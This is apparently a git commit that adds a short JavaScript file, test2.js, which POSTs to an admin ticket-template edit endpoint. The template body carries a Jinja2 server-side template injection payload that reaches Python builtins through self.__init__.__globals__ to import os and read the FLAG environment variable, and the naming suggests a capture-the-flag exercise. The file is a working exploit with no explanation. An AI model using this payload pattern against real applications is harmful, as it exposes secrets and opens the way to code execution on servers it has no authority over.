c2499811dcd44d7401dbd7d076ca49bc22f70613
Matěj Volf <git@mvolfik.com>
2026-04-23 08:47:31 +0200

    stash

---
+++ test2.js
@@ -0,0 +1,9 @@
+fetch("/admin/templates/1/edit", {
+  method: "POST",
+  body: "name=Default+Ticket+Template&html_content=" +
+    encodeURIComponent("testaa<h1>{{ event_name }}</h1><p>{{ buyer_name }}</p><p>{{ ticket_code }} {{ self.__init__.__globals__.__builtins__.__import__('os').environ['FLAG'] }}bagrxxxxx</p>") +
+    "&is_default=on",
+  headers: {
+    "content-type": "application/x-www-form-urlencoded"
+  }
+})
